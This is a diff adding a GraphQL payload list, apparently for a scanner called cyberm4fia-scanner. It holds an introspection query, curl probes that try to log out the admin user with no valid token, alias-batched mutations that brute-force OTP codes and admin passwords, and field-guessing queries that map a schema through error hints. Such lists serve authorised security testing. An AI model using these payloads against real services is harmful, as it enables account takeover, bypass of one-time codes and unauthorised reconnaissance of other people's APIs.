@@ -1,0 +1,34 @@
+# GraphQL Payloads — cyberm4fia-scanner
+# Categories: Alias Batching, Auth Bypass, Schema Recon, Introspection
+
+# ─── Introspection Query ───
+{ __schema { queryType { name fields { name args { name type { name kind } } } } mutationType { name fields { name } } } }
+
+# ─── Auth Bypass Probe ───
+curl -X POST target/graphql -H "Content-Type: application/json" -d '{"query":"mutation { logout(userName: \"admin\") { success } }"}'
+curl -X POST target/graphql -H "Content-Type: application/json" -H "Authorization: Bearer invalid" -d '{"query":"mutation { logout(userName: \"admin\") { success } }"}'
+
+# ─── Alias Batching (OTP Brute Force) ───
+mutation BatchBrute {
+  a1: verifyOtp(token: "000001") { success }
+  a2: verifyOtp(token: "000002") { success }
+  a3: verifyOtp(token: "000003") { success }
+  a4: verifyOtp(token: "000004") { success }
+  a5: verifyOtp(token: "000005") { success }
+  a6: verifyOtp(token: "000006") { success }
+  a7: verifyOtp(token: "000007") { success }
+  a8: verifyOtp(token: "000008") { success }
+  a9: verifyOtp(token: "000009") { success }
+  a10: verifyOtp(token: "000010") { success }
+}
+
+# ─── Alias Batching (Login Brute Force) ───
+mutation BatchLogin {
+  a1: login(username: "admin", password: "pass1") { token }
+  a2: login(username: "admin", password: "pass2") { token }
+}
+
+# ─── Clairvoyance (Schema Recon without Introspection) ───
+{ usr } → "Did you mean \"user\"?"
+{ user } → "\"user\" of type \"ActiveUser\" must have subfields"
+{ user { eml } } → "Did you mean \"email\"?"
